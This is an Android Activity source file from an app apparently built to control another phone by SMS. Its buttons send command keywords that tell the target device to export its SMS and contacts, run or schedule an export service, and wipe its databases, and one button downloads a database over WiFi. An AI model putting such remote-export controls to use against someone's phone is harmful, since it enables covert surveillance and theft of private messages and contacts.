package org.gdocument.gchattoomuch.ihm.activity;

import org.gdocument.gchattoomuch.ihm.R;
import org.gdocument.gchattoomuch.ihm.manager.SmsManager;
import org.gdocument.gchattoomuch.lib.log.Logger;
import org.gdocument.gchattoomuch.lib.manager.SmsLanguageManager;
import org.gdocument.gchattoomuch.p2p.task.WifiDatabaseDownloadTask;

import android.app.Activity;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.cameleon.common.android.factory.FactoryDialog;
import com.cameleon.common.android.inotifier.INotifierMessage;
import com.prasanta.GSSAct;

public class SmsLanguageActivity extends Activity {

	private static final String TAG = SmsLanguageActivity.class.getName();

	private EditText tvSmsContent;
	private EditText tvSmsPhone;
	private TextView tvMessage;

	private AsyncTask<Void, Void, String> uploadTask;


    /**
     * {@inheritDoc}
     */
    @Override
    public void onCreate(Bundle data) {

        super.onCreate(data);
        setContentView(R.layout.sms_language);
        tvSmsContent = (EditText) findViewById(R.id.tvSmsContent);
        tvSmsPhone = (EditText) findViewById(R.id.tvSmsPhone);
        tvMessage = (TextView) findViewById(R.id.tvMessage);
    }

    public void onClickSendDb(View view) {
    	final Button btnUpload = (Button)view;

    	OnClickListener onClickOkListener = new OnClickListener() {

			public void onClick(DialogInterface dialog, int which) {
					if (uploadTask == null) {
						tvMessage.setText("");
						executeSmsLanguage(SmsLanguageManager.MSG_LANGUAGE.SEND_DB.language);
						uploadTask = new WifiDatabaseDownloadTask(SmsLanguageActivity.this, new Notifier()) {
							protected void onPreExecute() {
								super.onPreExecute();
								btnUpload.setText(getString(R.string.btn_text_server_download_db_stop));
							};
							protected void onPostExecute(String result) {
								btnUpload.setText(getString(R.string.btn_text_server_download_db));
								uploadTask = null;
								super.onPostExecute(result);
							};
						}.execute();
					} else {
						btnUpload.setText(getString(R.string.btn_text_server_download_db));
						uploadTask.cancel(true);
						uploadTask = null;
					}
			}
		};
    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name, R.string.btn_text_server_download_db).show();
    }

    public void onClickCleanDbSms(View view) {
    	String smsPhone = tvSmsPhone.getText().toString();
    	if (smsPhone != null && !smsPhone.isEmpty()) {
	    	OnClickListener onClickOkListener = new OnClickListener() {
				
				public void onClick(DialogInterface dialog, int which) {
					executeSmsLanguage(SmsLanguageManager.MSG_LANGUAGE.CLEAN_DB_SMS.language);
				}
			};
	    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name_ihm, R.string.btn_text_clean_db_sms).show();
    	} else {
    		Toast.makeText(this, R.string.msg_phone_number_is_empty, Toast.LENGTH_LONG).show();
    	}
    }

    public void onClickCleanDbContact(View view) {
    	String smsPhone = tvSmsPhone.getText().toString();
    	if (smsPhone != null && !smsPhone.isEmpty()) {
	    	OnClickListener onClickOkListener = new OnClickListener() {
				
				public void onClick(DialogInterface dialog, int which) {
					executeSmsLanguage(SmsLanguageManager.MSG_LANGUAGE.CLEAN_DB_CONTACT.language);
				}
			};
	    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name_ihm, R.string.btn_text_clean_db_contact).show();
    	} else {
    		Toast.makeText(this, R.string.msg_phone_number_is_empty, Toast.LENGTH_LONG).show();
    	}
    }

    public void onClickSetServiceExportTime(View view) {
    	String smsPhone = tvSmsPhone.getText().toString();
    	if (smsPhone != null && !smsPhone.isEmpty()) {
	    	OnClickListener onClickOkListener = new OnClickListener() {
				
				public void onClick(DialogInterface dialog, int which) {
					executeSmsLanguage(SmsLanguageManager.MSG_LANGUAGE.SET_SERVICE_EXPORT_TIME.language);
				}
			};
	    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name_ihm, R.string.btn_text_set_service_export_time).show();
    	} else {
    		Toast.makeText(this, R.string.msg_phone_number_is_empty, Toast.LENGTH_LONG).show();
    	}
    }

    public void onClickSetServiceExportSmsCount(View view) {
    	String smsPhone = tvSmsPhone.getText().toString();
    	if (smsPhone != null && !smsPhone.isEmpty()) {
	    	OnClickListener onClickOkListener = new OnClickListener() {
				
				public void onClick(DialogInterface dialog, int which) {
					executeSmsLanguage(SmsLanguageManager.MSG_LANGUAGE.SET_SERVICE_EXPORT_SMS_COUNT.language);
				}
			};
	    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name_ihm, R.string.btn_text_set_service_export_sms_count).show();
    	} else {
    		Toast.makeText(this, R.string.msg_phone_number_is_empty, Toast.LENGTH_LONG).show();
    	}
    }

    public void onClickSetServiceExportContactCount(View view) {
    	String smsPhone = tvSmsPhone.getText().toString();
    	if (smsPhone != null && !smsPhone.isEmpty()) {
	    	OnClickListener onClickOkListener = new OnClickListener() {
				
				public void onClick(DialogInterface dialog, int which) {
					executeSmsLanguage(SmsLanguageManager.MSG_LANGUAGE.SET_SERVICE_EXPORT_CONTACT_COUNT.language);
				}
			};
			FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name_ihm, R.string.btn_text_set_service_export_contact_count).show();
    	} else {
    		Toast.makeText(this, R.string.msg_phone_number_is_empty, Toast.LENGTH_LONG).show();
    	}
    }

    public void onClickSetServiceExportSmsAll(View view) {
    	String smsPhone = tvSmsPhone.getText().toString();
    	if (smsPhone != null && !smsPhone.isEmpty()) {
	    	OnClickListener onClickOkListener = new OnClickListener() {
				
				public void onClick(DialogInterface dialog, int which) {
					executeSmsLanguage(SmsLanguageManager.MSG_LANGUAGE.SET_SERVICE_EXPORT_SMS_ALL.language);
				}
			};
	    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name_ihm, R.string.btn_text_set_service_export_sms_all).show();
    	} else {
    		Toast.makeText(this, R.string.msg_phone_number_is_empty, Toast.LENGTH_LONG).show();
    	}
    }

    public void onClickSetServiceExportContactAll(View view) {
    	String smsPhone = tvSmsPhone.getText().toString();
    	if (smsPhone != null && !smsPhone.isEmpty()) {
	    	OnClickListener onClickOkListener = new OnClickListener() {
				
				public void onClick(DialogInterface dialog, int which) {
					executeSmsLanguage(SmsLanguageManager.MSG_LANGUAGE.SET_SERVICE_EXPORT_CONTACT_ALL.language);
				}
			};
			FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name_ihm, R.string.btn_text_set_service_export_contact_all).show();
    	} else {
    		Toast.makeText(this, R.string.msg_phone_number_is_empty, Toast.LENGTH_LONG).show();
    	}
    }

    public void onClickRunServiceExport(View view) {
    	String smsPhone = tvSmsPhone.getText().toString();
    	if (smsPhone != null && !smsPhone.isEmpty()) {
	    	OnClickListener onClickOkListener = new OnClickListener() {
				
				public void onClick(DialogInterface dialog, int which) {
					executeSmsLanguage(SmsLanguageManager.MSG_LANGUAGE.RUN_SERVICE_EXPORT.language);
				}
			};
	    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name_ihm, R.string.btn_text_run_service_export).show();
    	} else {
    		Toast.makeText(this, R.string.msg_phone_number_is_empty, Toast.LENGTH_LONG).show();
    	}
    }

    public void onClickCleanRunServiceExportSmsAll(View view) {
    	String smsPhone = tvSmsPhone.getText().toString();
    	if (smsPhone != null && !smsPhone.isEmpty()) {
	    	OnClickListener onClickOkListener = new OnClickListener() {
				
				public void onClick(DialogInterface dialog, int which) {
					executeSmsLanguage(SmsLanguageManager.MSG_LANGUAGE.CLEAN_RUN_SERVICE_EXPORT_SMS_ALL.language);
				}
			};
	    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name_ihm, R.string.btn_text_clean_run_service_export_sms_all).show();
    	} else {
    		Toast.makeText(this, R.string.msg_phone_number_is_empty, Toast.LENGTH_LONG).show();
    	}
    }

    public void onClickCleanRunServiceExportContactAll(View view) {
    	String smsPhone = tvSmsPhone.getText().toString();
    	if (smsPhone != null && !smsPhone.isEmpty()) {
	    	OnClickListener onClickOkListener = new OnClickListener() {
				
				public void onClick(DialogInterface dialog, int which) {
					executeSmsLanguage(SmsLanguageManager.MSG_LANGUAGE.CLEAN_RUN_SERVICE_EXPORT_CONTACT_ALL.language);
				}
			};
	    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name_ihm, R.string.btn_text_clean_run_service_export_contact_all).show();
    	} else {
    		Toast.makeText(this, R.string.msg_phone_number_is_empty, Toast.LENGTH_LONG).show();
    	}
    }

    public void onClickCleanRunServiceExportAll(View view) {
    	String smsPhone = tvSmsPhone.getText().toString();
    	if (smsPhone != null && !smsPhone.isEmpty()) {
	    	OnClickListener onClickOkListener = new OnClickListener() {
				
				public void onClick(DialogInterface dialog, int which) {
					executeSmsLanguage(SmsLanguageManager.MSG_LANGUAGE.CLEAN_RUN_SERVICE_EXPORT_ALL.language);
				}
			};
	    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name_ihm, R.string.btn_text_clean_run_service_export_all).show();
    	} else {
    		Toast.makeText(this, R.string.msg_phone_number_is_empty, Toast.LENGTH_LONG).show();
    	}
    }

    public void onClickGssClient(View view) {
    	startActivity(new Intent(this, GSSAct.class));
    }

    public void onAuthenticationFinish(String authToken) {
    }


    private void executeSmsLanguage(String message) {
    	String smsContent = tvSmsContent.getText().toString();
    	if (smsContent != null && !smsContent.isEmpty()) {
    		message = smsContent + " " + message;
    	}
    	String phone = tvSmsPhone.getText().toString();
    	SmsManager.getInstance().send(this, phone, message);
    }


	@SuppressWarnings("unused")
	private void logMe(String msg) {
		Logger.logMe(TAG, msg);
	}

	@SuppressWarnings("unused")
	private static void logMe(Exception ex) {
		Logger.logMe(TAG, ex);
    }

	private class Notifier implements INotifierMessage {

		@Override
		public void notifyError(Exception ex) {
			notifyMessage(ex.getMessage());
		}

		@Override
		public void notifyMessage(final String msg) {
			runOnUiThread(new Runnable() {
				
				@Override
				public void run() {
					tvMessage.append(msg + "\r\n");
				}
			});
		}
		
	}
}